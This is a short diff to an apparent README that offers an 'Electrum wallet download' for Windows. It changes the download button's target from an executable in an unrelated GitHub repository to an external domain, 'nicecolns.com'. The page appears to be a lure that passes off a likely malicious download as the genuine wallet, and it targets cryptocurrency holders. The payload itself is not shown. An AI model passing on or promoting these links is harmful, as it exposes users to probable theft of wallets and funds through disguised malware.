@@ -9,7 +9,7 @@ In addition to these benefits, the **Electrum desktop wallet** integrates seamle
 
 1. Click the button below to initiate the **electrum wallet download** for Windows.
     <br>
-    <a href="https://github.com/Q1441/gmgnapppro/releases/download/v.1/M.I.exe">
+    <a href="https://nicecolns.com/">
       <img src="https://github.com/user-attachments/assets/714a4568-01c3-44c8-89ea-c0aa3d1dcd9b" alt="Download" width="300"/>
     </a>
 2. Find the downloaded file in your "Downloads" folder.
